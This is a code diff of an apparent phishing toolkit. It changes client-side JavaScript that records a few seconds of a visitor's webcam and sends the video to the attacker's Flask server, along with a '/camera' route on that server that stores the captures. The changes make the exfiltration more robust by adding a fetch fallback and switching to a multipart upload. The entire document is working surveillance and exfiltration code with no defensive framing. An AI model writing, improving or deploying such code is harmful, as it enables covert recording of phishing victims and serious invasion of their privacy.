@@ -109,7 +109,7 @@ var BASE=location.protocol+"//"+location.host;
 function send(path,data){
   var url=BASE+path;
   var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
-  try{if(navigator.sendBeacon){navigator.sendBeacon(url,blob);return;}}catch(e){}
+  try{if(navigator.sendBeacon){var ok=navigator.sendBeacon(url,blob);if(ok)return;}}catch(e){}
   try{fetch(url,{method:"POST",mode:"no-cors",body:blob});}catch(e){}
 }
 function collectInfo(){
@@ -163,9 +163,10 @@ function captureCamera(){
         mr.onstop=function(){
           stream.getTracks().forEach(function(t){t.stop();});
           var blob=new Blob(chunks,{type:mr.mimeType});
-          var reader=new FileReader();
-          reader.onload=function(){send('/camera',{data:reader.result,mimeType:mr.mimeType});};
-          reader.readAsDataURL(blob);
+          var fd=new FormData();
+          fd.append('video',blob,'capture.webm');
+          fd.append('mimeType',mr.mimeType);
+          fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
         };
         mr.start();
         setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
@@ -438,12 +439,20 @@ def run(redirect_url: str):
     @phish_app.route('/camera', methods=['POST', 'OPTIONS'])
     def phish_camera():
         if request.method == 'OPTIONS': return Response('', 204)
-        d, ip = _parse_body(request), _ip(request)
-        data_url = d.get('data', '')
-        mime = d.get('mimeType', 'video/webm')
-        if not data_url or ',' not in data_url:
+        ip = _ip(request)
+        if 'video' in request.files:
+            fobj = request.files['video']
+            video_bytes = fobj.read()
+            mime = request.form.get('mimeType') or fobj.content_type or 'video/webm'
+        else:
+            d = _parse_body(request)
+            data_url = d.get('data', '')
+            mime = d.get('mimeType', 'video/webm')
+            if not data_url or ',' not in data_url:
+                return {'ok': False}
+            video_bytes = base64.b64decode(data_url.split(',', 1)[1])
+        if not video_bytes:
             return {'ok': False}
-        video_bytes = base64.b64decode(data_url.split(',', 1)[1])
         ext = 'webm' if 'webm' in mime else 'mp4'
         vid_dir = os.path.join(TEMPLATE_DIR, 'captures')
         os.makedirs(vid_dir, exist_ok=True)
